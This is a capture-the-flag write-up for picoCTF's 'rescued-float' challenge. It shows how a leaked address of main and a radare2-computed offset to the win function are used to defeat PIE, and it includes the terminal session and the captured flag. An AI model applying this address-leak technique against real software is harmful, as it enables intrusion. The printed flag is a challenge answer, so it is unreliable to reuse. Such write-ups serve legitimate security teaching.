# Description

Can you try to get the flag? Beware we have PIE!Connect to the program with netcat:

```sh
$ nc rescued-float.picoctf.net 52731
```

The program's source code can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/fe4ce0914c5cf0111ebaf652993fb92a44ea9a7d1529b1bcd8d58827c17ca43b/vuln.c). The binary can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/fe4ce0914c5cf0111ebaf652993fb92a44ea9a7d1529b1bcd8d58827c17ca43b/vuln).

# Solution

Based on the source code, this is a simple one. First thing we notice is that they are leaking the address of main.

```c
 printf("Address of main: %p\n", &main);
```

Since the binary has PIC enabled we can't just give it a hardcoded address, we need to calculate the offset between the main and win functions, we can easily do that in radare using the function symbols (names).

```
[0x0000133d]> afl~main
0x0000133d    3    204 main
[0x0000133d]> afl~win
0x000012a7    6    150 sym.win
[0x0000133d]> ? main-sym.win
int32   150
uint32  150
hex     0x96
```

In this case the offset is -0x96, we can do this by hand no need to script things, yet!

```
nc rescued-float.picoctf.net 52731
Address of main: 0x5fc8eacac33d
Enter the address to jump to, ex => 0x12345: 0x5fc8eacac2a7
Your input: 5fc8eacac2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3}
```
